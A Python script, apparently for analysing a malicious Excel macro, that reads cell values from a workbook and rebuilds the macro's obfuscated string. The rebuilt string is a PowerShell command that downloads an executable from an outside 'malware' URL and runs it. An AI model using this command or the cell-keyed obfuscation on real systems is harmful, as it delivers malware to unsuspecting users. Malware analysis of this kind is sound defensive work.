
import openpyxl

def read_worksheet_ranges(file_path, sheet_name):
    wb = openpyxl.load_workbook(file_path, read_only=True)
    ws = wb[sheet_name]

    cell_values = {}

    for row in ws.iter_rows(values_only=False):
        for cell in row:
            cell_values[cell.coordinate] = cell.value

    return cell_values



# def parse_file():
#     parsed_data = {}

#     CONDITION_LEN = len('If Sheets("Sheet2").Range(')

#     with open("qwerty.vba", "r") as f:
#         data = f.readlines()

#         for d in data:
#             if "Range" in d:
#                 sheet_range, _, must_equal_to_value, _ = d[CONDITION_LEN:].split(
#                     ' ')
#                 _range = sheet_range.replace(').Value', '').replace('"', '')
#                 expected_value = must_equal_to_value.replace('"', '')
#                 parsed_data[_range] = expected_value

#     return parsed_data


# def create_sheet(file_path, sheet_name):
#     wb = openpyxl.load_workbook(file_path)

#     if sheet_name in wb.sheetnames:
#         print(f"Sheet '{sheet_name}' already exists in the workbook.")
#         del wb[sheet_name]

#     wb.create_sheet(title=sheet_name)

#     wb.save(file_path)
#     print(f"Sheet '{sheet_name}' created successfully.")


# def assign_values(file_path, sheet_name, parsed_data: dict):
#     wb = openpyxl.load_workbook(file_path)

#     ws = wb[sheet_name]

#     for sheet_range, expected_value in parsed_data.items():
#         ws[sheet_range] = expected_value

#     wb.save(file_path)
#     print("Values assigned successfully.")


# def generate_file():
#     file_path = "deals.xlsm"
#     sheet_name = "Sheet2"
#     parsed_data = parse_file()

#     create_sheet(file_path, sheet_name)
#     assign_values(file_path, sheet_name, parsed_data)


def emulate():
    file_path = "deals_orig.xlsm"
    sheet_name = "Sheet2"
    sheet = read_worksheet_ranges(file_path, sheet_name)

    xc6fd40b407cb3aac0d068f54af14362e = "$OrA, "
    e5b138e644d624905ca8d47c3b8a2cf41 = " = '"
    tfd753b886f3bd1f6da1a84488dee93f9 = "akrz"
    t53df028c67b2f07f1069866e345c8b85 = "p"
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = "\'+$"
    qe32cd94f940ea527cf84654613d4fb5d = "omm"

    if sheet.get("M62") == "Iuzaz/iA":
        xc6fd40b407cb3aac0d068f54af14362e += "$jri);"
    if sheet.get("G80") == "bAcDPl8D":
        xc6fd40b407cb3aac0d068f54af14362e += "Invok"
    if sheet.get("P31") == "aI3bH4Rd":
        e5b138e644d624905ca8d47c3b8a2cf41 += "http"
    if sheet.get("B50") == "4L3bnaGQ":
        e5b138e644d624905ca8d47c3b8a2cf41 += "://f"
    if sheet.get("B32") == "QyycTMPU":
        xc6fd40b407cb3aac0d068f54af14362e += "e-Ite"
    if sheet.get("K47") == "0kIbOvsu":
        xc6fd40b407cb3aac0d068f54af14362e += "m $jri"
    if sheet.get("B45") == "/hRdSmbG":
        xc6fd40b407cb3aac0d068f54af14362e += ";brea"
    if sheet.get("D27") == "y9hFUyA8":
        e5b138e644d624905ca8d47c3b8a2cf41 += "ruit"
    if sheet.get("A91") == "De5234dF":
        e5b138e644d624905ca8d47c3b8a2cf41 += ".ret3"
    if sheet.get("I35") == "DP7jRT2v":
        e5b138e644d624905ca8d47c3b8a2cf41 += ".gan"
    if sheet.get("W48") == "/O/w/o57":
        xc6fd40b407cb3aac0d068f54af14362e += "k;} c"
    if sheet.get("R18") == "FOtBe4id":
        xc6fd40b407cb3aac0d068f54af14362e += "atch "
    if sheet.get("W6") == "9Vo7IQ+/":
        xc6fd40b407cb3aac0d068f54af14362e += '{}""'
    if sheet.get("U24") == "hmDEjcAE":
        e5b138e644d624905ca8d47c3b8a2cf41 += "g/ma"
    if sheet.get("C96") == "1eDPj4Rc":
        e5b138e644d624905ca8d47c3b8a2cf41 += "lwar"
    if sheet.get("B93") == "A72nfg/f":
        e5b138e644d624905ca8d47c3b8a2cf41 += ".rds8"
    if sheet.get("E90") == "HP5LRFms":
        e5b138e644d624905ca8d47c3b8a2cf41 += "e';$"
    if sheet.get("G39") == "MZZ/er++":
        tfd753b886f3bd1f6da1a84488dee93f9 += "f3zsd"
    if sheet.get("B93") == "ZX42cd+3":
        tfd753b886f3bd1f6da1a84488dee93f9 += "2832"
    if sheet.get("I15") == "e9x9ME+E":
        tfd753b886f3bd1f6da1a84488dee93f9 += "0918"
    if sheet.get("T46") == "7b69F2SI":
        tfd753b886f3bd1f6da1a84488dee93f9 += "2afd"
    if sheet.get("N25") == "Ga/NUmJu":
        e5b138e644d624905ca8d47c3b8a2cf41 += "CNTA"
    if sheet.get("N26") == "C1hrOgDr":
        e5b138e644d624905ca8d47c3b8a2cf41 += " = '"
    if sheet.get("C58") == "PoX7qGEp":
        e5b138e644d624905ca8d47c3b8a2cf41 += "banA"
    if sheet.get("B53") == "see2d/f":
        e5b138e644d624905ca8d47c3b8a2cf41 += "Fl0dd"
    if sheet.get("Q2") == "VKVTo5f+":
        e5b138e644d624905ca8d47c3b8a2cf41 += "NA-H"
    if sheet.get("L84") == "GSPMnc83":
        t53df028c67b2f07f1069866e345c8b85 += "oWe"
    if sheet.get("H35") == "aCxE//3x":
        t53df028c67b2f07f1069866e345c8b85 += "ACew"
    if sheet.get("R95") == "uIDW54Re":
        t53df028c67b2f07f1069866e345c8b85 += "Rs"
    if sheet.get("A24") == "PKRtszin":
        t53df028c67b2f07f1069866e345c8b85 += "HELL"
    if sheet.get("G33") == "ccEsz3te":
        t53df028c67b2f07f1069866e345c8b85 += "L3c33"
    if sheet.get("P31") == "aI3bH4Rd":
        t53df028c67b2f07f1069866e345c8b85 += " -c"
    if sheet.get("Z49") == "oKnlcgpo":
        tfd753b886f3bd1f6da1a84488dee93f9 += "4';$"
    if sheet.get("F57") == "JoTVytPM":
        tfd753b886f3bd1f6da1a84488dee93f9 += "jri="
    if sheet.get("M37") == "y7MxjsAO":
        tfd753b886f3bd1f6da1a84488dee93f9 += "$env:"
    if sheet.get("E20") == "ap0EvV5r":
        tfd753b886f3bd1f6da1a84488dee93f9 += "publ"
    if sheet.get("D11") == "Q/GXajeM":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "CNTA"
    if sheet.get("B45") == "/hRdSmbG":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "+'.ex"
    if sheet.get("D85") == "y4/6D38p":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "e';tr"
    if sheet.get("P2") == "E45tTsBe":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "4d2dx"
    if sheet.get("P24") == "d/v8oiH9":
        qe32cd94f940ea527cf84654613d4fb5d += "and"
    if sheet.get("V22") == "dI6oBK/K":
        qe32cd94f940ea527cf84654613d4fb5d += " """
    if sheet.get("G1") == "zJ1AdN0x":
        qe32cd94f940ea527cf84654613d4fb5d += "$oa"
    if sheet.get("Y93") == "E/5234dF":
        qe32cd94f940ea527cf84654613d4fb5d += "e$3fn"
    if sheet.get("A12") == "X42fc3/=":
        qe32cd94f940ea527cf84654613d4fb5d += "av3ei"
    if sheet.get("F57") == "JoTVytPM":
        qe32cd94f940ea527cf84654613d4fb5d += "K ="
    if sheet.get("L99") == "t8PygQka":
        qe32cd94f940ea527cf84654613d4fb5d += " ne"
    if sheet.get("X31") == "gGJBD5tp":
        qe32cd94f940ea527cf84654613d4fb5d += "w-o"
    if sheet.get("C42") == "Dq7Pu9Tm":
        qe32cd94f940ea527cf84654613d4fb5d += "bjec"
    if sheet.get("D22") == "X42/=rrE":
        qe32cd94f940ea527cf84654613d4fb5d += "aoX3&i"
    if sheet.get("T34") == "9u2uF9nM":
        qe32cd94f940ea527cf84654613d4fb5d += "t Ne"
    if sheet.get("G5") == "cp+qRR+N":
        qe32cd94f940ea527cf84654613d4fb5d += "t.We"
    if sheet.get("O17") == "Q8z4cV/f":
        qe32cd94f940ea527cf84654613d4fb5d += "bCli"
    if sheet.get("Y50") == "OML7UOYq":
        qe32cd94f940ea527cf84654613d4fb5d += "ent;"
    if sheet.get("P41") == "bG9LxJvN":
        qe32cd94f940ea527cf84654613d4fb5d += "$OrA"
    if sheet.get("L58") == "qK02fT5b":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "y{$oa"
    if sheet.get("P47") == "hXelsG2H":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "K.Dow"
    if sheet.get("A2") == "RcPl3722":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "Ry.is"
    if sheet.get("G64") == "Kvap5Ma0":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "nload"
    if sheet.get("H76") == "OjgR3YGk":
        z92ea38976d53e8b557cd5bbc2cd3e0f8 += "File("

    f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d + e5b138e644d624905ca8d47c3b8a2cf41 + \
        tfd753b886f3bd1f6da1a84488dee93f9 + \
        z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
    print(f)


emulate()